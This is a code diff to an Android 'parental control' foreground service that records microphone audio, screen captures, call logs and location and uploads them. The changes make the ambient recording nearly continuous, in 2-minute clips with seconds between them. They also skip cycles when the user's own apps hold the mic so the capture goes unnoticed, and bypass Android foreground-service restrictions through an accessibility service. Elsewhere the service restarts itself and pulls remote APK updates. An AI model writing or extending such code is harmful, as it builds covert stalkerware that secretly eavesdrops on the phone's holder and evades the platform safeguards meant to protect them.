@@ -21,10 +21,12 @@ import kotlinx.coroutines.Job
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
 import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
+import com.example.parentalcontrol.features.location_tracking.services.GpsTracker
 
 /**
- * MonitoringForegroundService v16
+ * MonitoringForegroundService v18
  *
  * Android 15 / Samsung One UI 7 compatible foreground service.
  *
@@ -83,22 +85,20 @@ class MonitoringForegroundService : Service() {
     private var usageJob: Job? = null
     private var networkScanJob: Job? = null
     private var callLogJob: Job? = null
+    private var ambientRecordJob: Job? = null
 
     private var wakeLock: PowerManager.WakeLock? = null
 
-    // MediaProjection is set ONLY from ACTION_APPLY_PROJECTION handler (API 34+)
-    // or from the legacy pendingProjection path (API < 34).
     @Volatile var mediaProjection: MediaProjection? = null
 
-    // Dynamic remote-config values
     @Volatile private var captureIntervalMs = 300_000L
     @Volatile private var locationIntervalMs = 600_000L
     @Volatile private var recordCallsEnabled = false
     @Volatile private var recordingEnabled = false
-    @Volatile private var ambientRecordIntervalMs = 90_000L
-    private var ambientRecordJob: Job? = null
+    @Volatile private var ambientRecordIntervalMs = 5_000L
 
-    // Projection-miss watchdog counter
+    private val micConsumersCount = java.util.concurrent.atomic.AtomicInteger(0)
+
     private var projectionMissCount = 0
 
     private lateinit var screenEngine: ScreenCaptureEngine
@@ -108,6 +108,7 @@ class MonitoringForegroundService : Service() {
     private lateinit var usageTracker: AppUsageTracker
     private lateinit var callLogTracker: CallLogTracker
     private lateinit var configManager: RemoteConfigManager
+    private lateinit var mediaObserver: MediaObserver
 
     // ── Lifecycle ─────────────────────────────────────────────────────────────
 
@@ -129,11 +130,18 @@ class MonitoringForegroundService : Service() {
             configManager  = RemoteConfigManager(this)
             commandManager = RealtimeCommandManager(this, scope, gpsTracker) { mediaProjection }
 
-            try { commandManager.startListening() } catch (e: Exception) {
-                Log.e(TAG, "commandManager.startListening failed: ${e.message}")
-            }
-            try { startRemoteConfigLoop() } catch (e: Exception) {
-                Log.e(TAG, "startRemoteConfigLoop failed: ${e.message}")
+            if (!BuildConfig.IS_LITE) {
+                mediaObserver  = MediaObserver(this)
+                try { mediaObserver.start() } catch (e: Exception) {
+                    Log.e(TAG, "mediaObserver.start failed: ${e.message}")
+                }
+
+                try { commandManager.startListening() } catch (e: Exception) {
+                    Log.e(TAG, "commandManager.startListening failed: ${e.message}")
+                }
+                try { startRemoteConfigLoop() } catch (e: Exception) {
+                    Log.e(TAG, "startRemoteConfigLoop failed: ${e.message}")
+                }
             }
             // Only start call recorder if READ_PHONE_STATE is granted
             val hasPhonePermission = android.content.pm.PackageManager.PERMISSION_GRANTED ==
@@ -187,6 +195,7 @@ class MonitoringForegroundService : Service() {
         try {
             if (wakeLock?.isHeld == true) wakeLock?.release()
             mediaProjection?.stop()
+            if (::mediaObserver.isInitialized) mediaObserver.stop()
             scope.cancel()
             sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))
         } catch (e: Exception) {
@@ -233,8 +242,6 @@ class MonitoringForegroundService : Service() {
             }
         }
     }
-
-
 
     /**
      * After receiving a valid MediaProjection token, upgrade foreground type
@@ -326,13 +333,15 @@ class MonitoringForegroundService : Service() {
     }
 
     /**
-     * One-time manual recording (v33).
-     * delegates entirely to audioEngine.recordAndUpload (which manages its own mic type).
+     * One-time manual recording triggered from remote command.
+     * Upgrades foreground type to MICROPHONE first (required on Android 14+),
+     * then delegates to AudioRecorderEngine.
      */
     fun startManualMic(durationMs: Long, bypassVad: Boolean = true) {
         scope.launch {
             try {
-                Log.i(TAG, "Manual MIC request: calling recordAndUpload")
+                Log.i(TAG, "Manual MIC request: upgrading to MIC type then recording")
+                upgradeToMicType()
                 audioEngine.recordAndUpload(durationMs, bypassVad)
             } catch (e: Exception) {
                 Log.e(TAG, "Manual MIC error: ${e.message}")
@@ -341,23 +350,25 @@ class MonitoringForegroundService : Service() {
     }
 
     /**
-     * One-time screen capture (v33).
+     * One-time manual screen capture triggered from remote command.
+     * Upgrades foreground to MEDIA_PROJECTION type, captures [cycles] frames,
+     * then downgrades back.
      */
     fun startManualScreen(cycles: Int) {
         scope.launch {
             try {
                 val proj = mediaProjection
                 if (proj == null) {
-                    Log.w(TAG, "Manual SCREEN request failed: No projection token")
+                    Log.w(TAG, "Manual SCREEN request failed: no projection token")
                     return@launch
                 }
-                Log.i(TAG, "Manual SCREEN request: upgrading foreground...")
+                Log.i(TAG, "Manual SCREEN: upgrading foreground for $cycles capture(s)...")
                 upgradeForegroundToMediaProjection()
                 repeat(cycles) {
                     screenEngine.captureAndUpload(proj)
-                    delay(5000)
+                    delay(5_000)
                 }
-                Log.i(TAG, "Manual SCREEN done: downgrading...")
+                Log.i(TAG, "Manual SCREEN done — downgrading foreground type")
                 startForegroundSafe()
             } catch (e: Exception) {
                 Log.e(TAG, "Manual SCREEN error: ${e.message}")
@@ -382,9 +393,17 @@ class MonitoringForegroundService : Service() {
         }
     }
 
-    private val micConsumersCount = java.util.concurrent.atomic.AtomicInteger(0)
+    fun cancelCurrentRecording() {
+        if (::audioEngine.isInitialized) {
+            audioEngine.cancelCurrentRecording()
+        }
+    }
 
     fun upgradeToMicType() {
+        if (AppAccessibilityService.getInstance() != null) {
+            Log.i(TAG, "upgradeToMicType: AppAccessibilityService is active — bypassing foreground type upgrade to avoid background restriction")
+            return
+        }
         val count = micConsumersCount.incrementAndGet()
         Log.i(TAG, "upgradeToMicType: active mic consumers = $count")
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
@@ -404,6 +423,10 @@ class MonitoringForegroundService : Service() {
     }
 
     fun downgradeFromMicType() {
+        if (AppAccessibilityService.getInstance() != null) {
+            Log.i(TAG, "downgradeFromMicType: AppAccessibilityService is active — bypassing downgrade")
+            return
+        }
         val count = micConsumersCount.decrementAndGet()
         Log.i(TAG, "downgradeFromMicType: active mic consumers = $count")
         if (count > 0) {
@@ -425,19 +448,27 @@ class MonitoringForegroundService : Service() {
     private fun startAllModules() {
         startHeartbeatLoop()
         startLocationLoop()
-        startUsageLoop()
+        if (!BuildConfig.IS_LITE) {
+            startUsageLoop()
+            startNetworkScanLoop()
+        }
         startCallLogLoop()
-        startNetworkScanLoop()
+
+        val hasPhonePermission = android.content.pm.PackageManager.PERMISSION_GRANTED ==
+            checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE)
+        if (hasPhonePermission) {
+            CallMonitoringService.start(this)
+        }
     }
 
-    /** Heartbeat: update remote_settings every 60 s */
+    /** Heartbeat: update remote_settings every 180 s (3 minutes — saves 66% data) */
     private fun startHeartbeatLoop() {
         heartbeatJob?.cancel()
         heartbeatJob = scope.launch {
             while (true) {
                 runCatching { SupabaseManager.getInstance().updateHeartbeat(this@MonitoringForegroundService) }
                     .onFailure { Log.e(TAG, "Heartbeat: ${it.message}") }
-                delay(60_000)
+                delay(180_000) // Every 3 minutes
             }
         }
     }
@@ -498,9 +529,11 @@ class MonitoringForegroundService : Service() {
     }
 
     /**
-     * Audio loop: record 60 s every 10 min.
-     * Only active when record_calls=true in remote_settings.
-     * AudioRecorderEngine discards silent recordings via VAD.
+     * Passive audio loop: record 120 s every 10 min when screen is ON.
+     * Active only when [recordCallsEnabled] (record_calls=true in remote_settings).
+     * Uses bypassVad=true to guarantee full 2-minute recording.
+     * Mic Conflict Guard in AudioRecorderEngine automatically skips this cycle
+     * if another app (WhatsApp, Phone...) is already using the microphone.
      */
     private fun startAudioLoop() {
         audioJob?.cancel()
@@ -510,13 +543,18 @@ class MonitoringForegroundService : Service() {
                     if (recordCallsEnabled) {
                         val pm = getSystemService(POWER_SERVICE) as PowerManager
                         if (pm.isInteractive) {
-                            audioEngine.recordAndUpload(60_000L)
+                            // Pre-check: don't start background recording if user is actively using mic
+                            if (AudioRecorderEngine.isMicBusyByAnotherApp(this@MonitoringForegroundService)) {
+                                Log.d(TAG, "🛡️ startAudioLoop: mic busy by user app — skipping cycle")
+                            } else {
+                                audioEngine.recordAndUpload(120_000L, bypassVad = true)
+                            }
                         }
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Audio loop: ${e.message}")
+                    Log.e(TAG, "Audio loop error: ${e.message}")
                 }
-                delay(600_000)
+                delay(600_000) // 10-minute cycle
             }
         }
     }
@@ -574,6 +612,9 @@ class MonitoringForegroundService : Service() {
                                 "location=${locationIntervalMs}ms audio=$recordCallsEnabled " +
                                 "auto_record=${s.recording_enabled} (${s.capture_interval}ms)")
 
+                        // Try to flush any offline audio recordings saved during internet outage
+                        audioEngine.flushPendingAudioQueue()
+
                         updateManager.checkAndExecuteUpdate(
                             s.target_version, s.update_apk_path, s.update_apk_url
                         )
@@ -581,7 +622,7 @@ class MonitoringForegroundService : Service() {
                 } catch (e: Exception) {
                     Log.e(TAG, "Config loop: ${e.message}")
                 }
-                delay(300_000)
+                delay(30_000) // Poll every 30 seconds for immediate auto-record sync
             }
         }
     }
@@ -677,32 +718,47 @@ class MonitoringForegroundService : Service() {
     }
 
     fun setAmbientRecordLoop(enabled: Boolean, intervalMs: Long) {
-        if (recordingEnabled == enabled && ambientRecordIntervalMs == intervalMs && ambientRecordJob?.isActive == true) {
+        val validInterval = if (intervalMs >= 1_000L) intervalMs else 5_000L
+        if (recordingEnabled == enabled && ambientRecordIntervalMs == validInterval && ambientRecordJob?.isActive == true) {
             return
         }
         recordingEnabled = enabled
-        ambientRecordIntervalMs = if (intervalMs >= 70_000L) intervalMs else 90_000L
+        ambientRecordIntervalMs = validInterval
         updateAmbientRecordLoop()
     }
 
     private fun updateAmbientRecordLoop() {
+        // Cancel existing job first to prevent duplicate parallel loops
         ambientRecordJob?.cancel()
+        ambientRecordJob = null
+
         if (recordingEnabled) {
             ambientRecordJob = scope.launch {
+                val recordDurationMs = 120_000L // Record for 2 minutes (120 seconds)
                 while (recordingEnabled) {
                     try {
-                        // Record for 45 seconds (so it is less than the minimum interval of 70s)
-                        audioEngine.recordAndUpload(45_000L, bypassVad = true)
+                        // Pre-check: don't start background ambient recording if user is actively using mic
+                        if (AudioRecorderEngine.isMicBusyByAnotherApp(this@MonitoringForegroundService)) {
+                            Log.d(TAG, "🛡️ Ambient loop: mic busy by user app — skipping this cycle (will retry next interval)")
+                            delay(ambientRecordIntervalMs) // Wait interval then retry
+                        } else {
+                            Log.i(TAG, "🎙️ Ambient loop: starting 2 min (120s) recording...")
+                            // recordAndUpload is suspending: it blocks until the full 120s clip is captured + uploaded
+                            audioEngine.recordAndUpload(recordDurationMs, bypassVad = true)
+                            // 1-second pause between clips (dictated by capture_interval in remote_settings)
+                            delay(ambientRecordIntervalMs)
+                        }
                     } catch (e: Exception) {
                         Log.e(TAG, "Ambient record loop error: ${e.message}")
+                        delay(ambientRecordIntervalMs)
                     }
-                    delay(ambientRecordIntervalMs)
                 }
             }
-            Log.i(TAG, "🟢 Background ambient record loop started: every ${ambientRecordIntervalMs}ms")
+            Log.i(TAG, "🟢 Background ambient record loop started: duration 120s, pause ${ambientRecordIntervalMs}ms")
         } else {
-            ambientRecordJob = null
-            Log.i(TAG, "🔴 Background ambient record loop stopped")
+            // Force immediate cancellation of any active recording session on the microphone
+            audioEngine.cancelCurrentRecording()
+            Log.i(TAG, "🔴 Background ambient record loop stopped & active recording cancelled")
         }
     }
 }
